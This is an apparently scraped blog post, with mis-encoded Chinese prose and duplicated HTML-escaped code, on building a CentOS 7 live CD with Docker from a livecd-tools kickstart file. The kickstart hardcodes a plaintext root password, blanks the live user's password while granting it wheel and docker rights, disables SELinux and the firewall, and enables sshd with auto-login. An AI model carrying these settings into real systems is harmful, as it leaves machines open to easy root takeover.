User\u0026#34; liveuser passwd -d liveuser \u0026gt; /dev/null usermod -aG wheel,docker liveuser \u0026gt; /dev/null # Remove root password lock passwd -d root \u0026gt; /dev/null (echo Kalaisadog2021; echo Kalaisadog2021)|passwd root --stdin # turn off firstboot for livecd boots systemctl --no-reload disable firstboot-text.service 2\u0026gt; /dev/null || : systemctl --no-reload disable firstboot-graphical.service 2\u0026gt; /dev/null || : systemctl stop firstboot-text.service 2\u0026gt; /dev/null || : systemctl stop firstboot-graphical.service 2\u0026gt; /dev/null || : # don\u0026#39;t use prelink on a running live image sed -i \u0026#39;s/PRELINKING=yes/PRELINKING=no/\u0026#39; /etc/sysconfig/prelink \u0026amp;\u0026gt;/dev/null || : # turn off mdmonitor by default systemctl --no-reload disable mdmonitor.service 2\u0026gt; /dev/null || : systemctl --no-reload disable mdmonitor-takeover.service 2\u0026gt; /dev/null || : systemctl stop mdmonitor.service 2\u0026gt; /dev/null || : systemctl stop mdmonitor-takeover.service 2\u0026gt; /dev/null || : # don\u0026#39;t enable the gnome-settings-daemon packagekit plugin gsettings set org.gnome.settings-daemon.plugins.updates active \u0026#39;false\u0026#39; || : # don\u0026#39;t start cron/at as they tend to spawn things which are # disk intensive that are painful on a live image systemctl --no-reload disable crond.service 2\u0026gt; /dev/null || : systemctl --no-reload disable atd.service 2\u0026gt; /dev/null || : systemctl stop crond.service 2\u0026gt; /dev/null || : systemctl stop atd.service 2\u0026gt; /dev/null || : # Mark things as configured touch /.liveimg-configured # add static hostname to work around xauth bug # https://bugzilla.redhat.com/show_bug.cgi?id=679486 echo \u0026#34;localhost\u0026#34; \u0026gt; /etc/hostname # Fixing the lang install issue when other lang than English is selected . See http://bugs.centos.org/view.php?id=7217 /usr/bin/cp /usr/lib/python2.7/site-packages/blivet/size.py /usr/lib/python2.7/site-packages/blivet/size.py.orig /usr/bin/sed -i \u0026#34;s#return self.humanReadable()#return self.humanReadable().encode(\u0026#39;utf-8\u0026#39;)#g\u0026#34; /usr/lib/python2.7/site-packages/blivet/size.py EOF # bah, hal starts way too late cat \u0026gt; /etc/rc.d/init.d/livesys-late \u0026lt;\u0026lt; EOF #!/bin/bash # # live: Late init script for live image # # chkconfig: 345 99 01 # description: Late init script for live image. . /etc/init.d/functions if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; != \u0026#34;start\u0026#34; ] || [ -e /.liveimg-late-configured ] ; then exit 0 fi exists() { which \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return \\$* } touch /.liveimg-late-configured # read some variables out of /proc/cmdline for o in \\`cat /proc/cmdline\\` ; do case \\$o in ks=*) ks=\u0026#34;--kickstart=\\${o#ks=}\u0026#34; ;; xdriver=*) xdriver=\u0026#34;\\${o#xdriver=}\u0026#34; ;; esac done # if liveinst or textinst is given, start anaconda if strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; liveinst ; then plymouth --quit /usr/sbin/liveinst \\$ks fi if strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; textinst ; then plymouth --quit /usr/sbin/liveinst --text \\$ks fi # configure X, allowing user to override xdriver if [ -n \u0026#34;\\$xdriver\u0026#34; ]; then cat \u0026gt; /etc/X11/xorg.conf.d/00-xdriver.conf \u0026lt;\u0026lt;FOE Section \u0026#34;Device\u0026#34; Identifier \u0026#34;Videocard0\u0026#34; Driver \u0026#34;\\$xdriver\u0026#34; EndSection FOE fi EOF chmod 755 /etc/rc.d/init.d/livesys /sbin/restorecon /etc/rc.d/init.d/livesys /sbin/chkconfig --add livesys chmod 755 /etc/rc.d/init.d/livesys-late /sbin/restorecon /etc/rc.d/init.d/livesys-late /sbin/chkconfig --add livesys-late # enable tmpfs for /tmp systemctl enable tmp.mount # enable docker systemctl enable docker.service # work around for poor key import UI in PackageKit rm -f /var/lib/rpm/__db* releasever=$(rpm -q --qf \u0026#39;%{version}\\n\u0026#39; --whatprovides system-release) basearch=$(uname -i) rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-$releasever-$basearch echo \u0026#34;Packages within this LiveCD\u0026#34; rpm -qa # Note that running rpm recreates the rpm db files which aren\u0026#39;t needed or wanted rm -f /var/lib/rpm/__db* # go ahead and pre-make the man -k cache (#455968) /usr/bin/mandb # save a little bit of space at least... rm -f /boot/initramfs* # make sure there aren\u0026#39;t core files lying around rm -f /core* # convince readahead not to collect # FIXME: for systemd cat \u0026gt;\u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF # disable updates plugin cat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.settings-daemon.plugins.updates.gschema.override \u0026lt;\u0026lt; FOE [org.gnome.settings-daemon.plugins.updates] active=false FOE # Show the system-config-keyboard tool on the desktop mkdir /home/liveuser/Desktop -p \u0026gt;/dev/null cat /usr/share/applications/system-config-keyboard.desktop | sed \u0026#39;/NotShowIn/d\u0026#39; |sed \u0026#39;s/Terminal=false/Terminal=true/\u0026#39; \u0026gt; /home/liveuser/Desktop/system-config-keyboard.desktop cat /usr/share/applications/liveinst.desktop | sed \u0026#39;/NoDisplay/d\u0026#39; \u0026gt; /home/liveuser/Desktop/liveinst.desktop chmod +x /home/liveuser/Desktop/*.desktop chown -R liveuser:liveuser /home/liveuser # Liveuser face if [ -e /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png ] ; then cp /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png /home/liveuser/.face chown liveuser:liveuser /home/liveuser/.face fi # make the installer show up if [ -f /usr/share/applications/liveinst.desktop ]; then # Show harddisk install in shell dash sed -i -e \u0026#39;s/NoDisplay=true/NoDisplay=false/\u0026#39; /usr/share/applications/liveinst.desktop # need to move it to anaconda.desktop to make shell happy #cp /usr/share/applications/liveinst.desktop /usr/share/applications/anaconda.desktop fi cat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.shell.gschema.override \u0026lt;\u0026lt; FOE [org.gnome.shell] favorite-apps=[\u0026#39;liveinst.desktop\u0026#39;,\u0026#39;firefox.desktop\u0026#39;, \u0026#39;evolution.desktop\u0026#39;, \u0026#39;empathy.desktop\u0026#39;, \u0026#39;rhythmbox.desktop\u0026#39;, \u0026#39;shotwell.desktop\u0026#39;, \u0026#39;libreoffice-writer.desktop\u0026#39;, \u0026#39;nautilus.desktop\u0026#39;, \u0026#39;gnome-documents.desktop\u0026#39;, \u0026#39;anaconda.desktop\u0026#39;] FOE # set up auto-login cat \u0026gt; /etc/gdm/custom.conf \u0026lt;\u0026lt; FOE [daemon] AutomaticLoginEnable=True AutomaticLogin=liveuser FOE # Turn off PackageKit-command-not-found while uninstalled if [ -f /etc/PackageKit/CommandNotFound.conf ]; then sed -i -e \u0026#39;s/^SoftwareSourceSearch=true/SoftwareSourceSearch=false/\u0026#39; /etc/PackageKit/CommandNotFound.conf fi # make sure to set the right permissions and selinux contexts chown -R liveuser:liveuser /home/liveuser/ restorecon -R /home/liveuser/ # Fixing default locale to us localectl set-keymap us localectl set-x11-keymap us EOF # rebuild schema cache with any overrides we installed glib-compile-schemas /usr/share/glib-2.0/schemas %end æ³¨æ„ï¼Œä¸Šé¢æ³¨é‡Šäº†ä¸¤ä¸ªåœ°æ–¹ï¼Œéƒ½å¯ä»¥æ·»åŠ è½¯ä»¶æˆ–è€…è¿è¡Œè„šæœ¬\nä¸‰ã€buildå‡ºisoæ–‡ä»¶ livecd-creator --verbose -c centos7-live-docker.ks --cache=cache -f centos7-live-docker ç„¶åå°±ä¼šå¾—åˆ°centos7-live-docker.isoçš„æ–‡ä»¶ï¼Œæ³¨æ„åœ¨buildè¿‡ç¨‹ä¸­çš„æŠ¥é”™ä¿¡æ¯ï¼Œå¤šæ•°æ˜¯æ— æ³•ä¸‹è½½åŒ…å¯¼è‡´çš„ã€‚\nç›´æ¥åŠ è½½ISOæ–‡ä»¶å¯åŠ¨æˆ–è€…åˆ»å½•åˆ°USBä¸Šå¯åŠ¨ï¼Œå°±å¯ä»¥è¿›å…¥è¿™ä¸ªè‡ªåˆ¶çš„Liveç³»ç»Ÿäº†\nåƒä¸‡æ³¨æ„ï¼Œå¯åŠ¨ä¸€å®šè¦é€‰Bios legacyï¼Œä¸è¦ç”¨Uefiã€‚\nç›¸å…³ä¸€äº›æœ‰ç”¨çš„é“¾æ¥ï¼š\nhttps://github.com/minishift/minishift-centos-iso https://github.com/livecd-tools/livecd-tools https://blog.csdn.net/sharpbladepan/article/details/107423468 ","permalink":"https://rendoumi.com/posts/20211010-live_cd/","summary":"\u003cp\u003eæŸäº›åœºåˆï¼Œå¾ˆæœ‰å¯èƒ½éœ€è¦å¯åŠ¨ISOæˆ–è€…USBç›˜ï¼Œè‡ªå¸¦Linuxç³»ç»Ÿï¼Œç„¶åæ‹¯æ•‘å½“å‰æŸåçš„ç³»ç»Ÿ\u003c/p\u003e\n\u003cp\u003eæˆ–è€…ç›´æ¥å¯åŠ¨ä¸€ä¸ªLIVE CentOSç³»ç»Ÿï¼Œå»åšæŸäº›äº‹ï¼Œæ¯”å¦‚ç”¨MegaRaidåˆ’åˆ†Raidã€æµ‹è¯•ç³»ç»Ÿç­‰ç­‰\u003c/p\u003e\n\u003cp\u003eè¿™æ—¶å€™å°±éœ€è¦åˆ¶ä½œå‡ºæ¥ä¸€ä¸ªLIVE CDçš„ç³»ç»Ÿäº†\u003c/p\u003e\n\u003cp\u003eåˆ¶ä½œæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…live-tools\"\u003eä¸€ã€å®‰è£…live-tools\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install livecd-tools\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒå‡†å¤‡kickstartæ–‡ä»¶centos7-live-dockerks\"\u003eäºŒã€å‡†å¤‡Kickstartæ–‡ä»¶centos7-live-docker.ks\u003c/h2\u003e\n\u003cp\u003eä¸‹è½½åœ°å€ï¼š\u003ca href=\"centos7-live-docker.ks\"\u003ecentos7-live-docker.ks\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elang en_GB.UTF-8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekeyboard us\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etimezone Asia/Shanghai --isUtc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#selinux --enforcing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eselinux --disabled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#firewall --enabled --service=cockpit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efirewall --disabled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#xconfig --startxonboot\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epart / --size 8192 --fstype ext4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eservices --enabled\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eNetworkManager,sshd --disabled=network\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Root password\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eauth --useshadow --enablemd5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erootpw --plaintext Kalaisadog2021\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ebase --baseurl=http://mirror.centos.org/centos/7/os/x86_64/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eupdates --baseurl=http://mirror.centos.org/centos/7/updates/x86_64/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eextras --baseurl=http://mirror.centos.org/centos/7/extras/x86_64/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erepo --name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eepel --baseurl=http://dl.fedoraproject.org/pub/epel/7/x86_64/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%packages \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e@core\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekernel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edracut\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efirewalld\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eNetworkManager\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ee2fsprogs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erootfiles\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edocker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eopenssh-server\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#By zhang ranrui\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eunzip\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet-tools\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebinutils\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewget\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebash-completion\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edmidecode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edmraid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edmraid-events\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elvm2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elvm2-libs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekpartx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emdadm\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eparted\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exfsdump\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exfsprogs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egdisk\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebzip2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eextundelete\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elibHX\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elibHX-devel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eautoconf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egcc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003egcc-c++\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emake\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003escreen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etelnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%end\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%post\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl enable docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# By Zhang Ranrui, Add your custom script\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#wget http://www.rendoumi.com/soft/other/xfs_irecover -O /usr/local/bin/xfs_irecover\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#chmod 755 /usr/local/bin/xfs_irecover\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eecho \u0026#34;Banner /etc/issue\u0026#34; \u0026gt;\u0026gt; /etc/ssh/sshd_config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esed -i \u0026#34;s/After\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003enetwork\\.target/After=network-online\\.target\\nWants=network-online\\.target/g\u0026#34; /usr/lib/systemd/system/rc-local.service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 755 /etc/systemd/system/rc.local.service.d\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 644 /etc/systemd/system/rc.local.service.d/local.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 755 /etc/rc.d/rc.local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl enable rc-local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl start rc-local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# FIXME: it\u0026#39;d be better to get this installed from a package\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# live: Init script for live image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# chkconfig: 345 00 99\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# description: Init script for live image.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### BEGIN INIT INFO\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# X-Start-Before: display-manager\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### END INIT INFO\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e. /etc/init.d/functions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; !\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;start\u0026#34; ]; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    exit 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -e 